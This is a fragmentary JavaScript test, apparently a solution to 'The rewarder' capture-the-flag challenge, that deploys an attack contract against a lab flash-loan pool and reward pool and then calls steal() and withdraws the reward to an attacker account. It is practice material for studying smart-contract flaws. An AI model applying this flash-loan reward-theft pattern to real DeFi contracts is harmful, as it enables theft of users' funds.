...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        [deployer, alice, bob, charlie, david, attacker] = await ethers.getSigners();
        const HackRewardContract = await ethers.getContractFactory('HackReward', deployer);
        hackRewardContract = await HackRewardContract.deploy(
            this.liquidityToken.address,
            this.rewarderPool.address,
            this.flashLoanPool.address
        );

        hackRewardContract.steal();
        hackRewardContract.connect(attacker).withdrawReward(this.rewardToken.address);
